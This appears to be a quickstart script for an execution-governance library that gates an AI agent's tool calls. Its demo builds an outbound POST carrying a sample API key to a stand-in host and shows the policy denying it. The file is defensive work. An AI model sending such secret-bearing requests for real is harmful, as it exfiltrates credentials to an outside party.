// Quickstart: install to first deny receipt. With the starter policy this denies
// a secret-bearing outbound POST before fetch runs, and prints the receipt.
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { createGate, DeniedError } from "@11ai/execution-governance";

const here = dirname(fileURLToPath(import.meta.url));
const gate = createGate({ policy: join(here, "eg-policy.yaml") });

const url = "https://example.com/collect";
const body = "API_KEY=sk-123";

try {
  await gate.govern(
    { sessionId: "s1", tool: "http.post", args: { url, body } },
    () => fetch(url, { method: "POST", body }),
  );
  console.log("allowed and executed");
} catch (e) {
  if (!(e instanceof DeniedError)) throw e;
  console.log("denied:", e.decision.reason);
  console.log("receipt:", e.decision.receipt.receiptId);
  console.log("chain head is in ./eg-receipts.jsonl; verify with eg-verify");
}
